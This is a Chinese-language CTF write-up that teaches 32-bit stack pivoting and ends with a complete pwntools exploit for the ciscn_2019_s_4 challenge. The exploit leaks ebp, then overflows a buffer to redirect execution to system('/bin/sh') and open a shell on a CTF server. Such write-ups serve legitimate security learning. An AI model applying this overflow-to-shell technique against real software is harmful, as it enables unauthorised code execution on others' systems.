前置知识：汇编语言（第4版）前半本
注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret
函数调用栈的基本结构
一些寄存器的作用：
EIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。
EBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。
ESP：始终指向栈顶。
在进入一个函数时，会执行如下操作。
push eip+4
push ebp
mov ebp,esp
在执行完退出时，会执行如下操作。
mov esp,ebp
pop ebp
pop eip
即leave和ret。
整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。
函数调用栈工作时的结构如下图：

其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：
void func(int a){
int b,c;
char s[10];
}
这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。
考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。
但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。
栈迁移
栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。
也就是说，要构造栈中数据如图所示：

至于为什么要-4，后面模拟的过程中读者自能体会。
好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：

然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：

这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。
例题：ciscn_2019_s_4
所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。
惯例checksec，只开了NX。
ida分析得到：
int vul()
{
char buf[40]; // [esp+0h] [ebp-28h] BYREF
memset(buf, 0, 0x20u);
read(0, buf, 0x30u);
printf("Hello, %s\n", buf);
read(0, buf, 0x30u);
return printf("Hello, %s\n", buf);
}
发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。
第一次读满0x28个字节，由于printf输出的时候会一直输出到\x00为止，所以会把ebp也一起输出来。
在第二次输入的时候构造一个栈迁移的结构，将栈迁移到我们能控制的buf段。

结合文章开头函数调用栈的知识，不难理解，‘bin/sh’和buf_addr+12都将作为输入的参数输入到system函数中，所以程序最终执行的效果就是获取了shell。
注意到我们需要填入的信息中需要我们预先知道buf的地址，可以在本地动态调试（gdb）中获取ebp和buf地址的差值，然后作差得到。不要想当然地认为buf和ebp的差值就是0x28，这只是在read函数中的情况，此处的ebp指的是vul函数中的ebp，即read函数中ebp指向的oldebp。
EXP：
from psutil import process_iter
from pwn import *
context(arch="i386",log_level="debug")
op=0
e=ELF("ciscn-s-4.bin")
sys_addr=e.symbols['system']
leave_addr=0x080484B8
def main():
if op==1:
zeroy=process("ciscn-s-4.bin")
else:
zeroy=remote("node4.buuoj.cn",27827)
payload1=b'a'*0x24+b"bbbb"
zeroy.recvuntil("name?")
zeroy.send(payload1)
zeroy.recvuntil("bbbb")
ebp_addr=u32(zeroy.recv(4))
print("ebp_addr: ",hex(ebp_addr))
buf_addr=ebp_addr-0x38
payload2=p32(sys_addr)+b'aaaa'+p32(buf_addr+12)+b'/bin/sh\x00'
payload2=payload2.ljust(0x28,b'a')+p32(buf_addr-4)+p32(leave_addr)
zeroy.send(payload2)
zeroy.interactive()
main()